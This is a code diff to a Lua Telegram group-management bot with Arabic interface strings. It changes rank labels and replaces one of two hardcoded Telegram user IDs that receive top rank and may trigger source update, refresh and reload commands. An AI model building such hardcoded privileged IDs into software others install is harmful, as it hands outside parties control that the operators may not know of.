@@ -279,9 +279,9 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 879123322  then 
-msg.TheRankCmd = 'مطور السورس'
-msg.TheRank = 'مطور السورس'
+if msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 1718587141  then 
+msg.TheRankCmd = 'Legend'
+msg.TheRank = 'Legend'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mishary' 
@@ -292,12 +292,12 @@ msg.TheRankCmd = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'Dev'
 msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'Dev'
 msg.Rank = 2
 elseif msg.GroupActive and redis:sismember(boss..':Malk_Group:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك'
-msg.TheRank = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك '
+msg.TheRankCmd = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك اساسي'
+msg.TheRank = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك اساسي '
 msg.Rank = 22
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
-msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
+msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'مالك'
+msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'مالك'
 msg.Rank = 11
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
@@ -596,19 +596,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 879123322) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 1718587141) then
 return sendMsg(msg.chat_id_,msg.id_,"- تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 879123322) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 1718587141) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم تحديث وتثبيت السورس  *} .\n\n- { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 879123322) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 1718587141) then
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم أعـاده تشغيل البوت  *} .\n\n- { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
